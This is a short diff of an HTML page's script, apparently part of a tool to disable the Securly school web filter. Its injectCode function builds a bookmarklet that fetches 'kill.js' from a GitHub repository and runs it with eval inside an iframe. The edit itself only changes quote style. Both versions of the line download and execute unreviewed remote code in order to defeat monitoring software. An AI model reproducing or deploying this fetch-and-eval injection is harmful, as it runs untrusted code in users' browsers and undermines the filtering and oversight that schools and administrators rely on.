@@ -40,7 +40,7 @@
 	<script>
 		function injectCode() {
 			const iframe = document.querySelector('iframe');
-			const bookmarkletCode = `javascript:fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js').then(r=>r.text()).then(r=>eval(r))`;
+			const bookmarkletCode = `javascript:fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r=>r.text()).then(r=>eval(r))`;
 			const script = document.createElement('script');
 			script.text = `(${bookmarkletCode})();`;
 			iframe.contentWindow.document.body.appendChild(script);
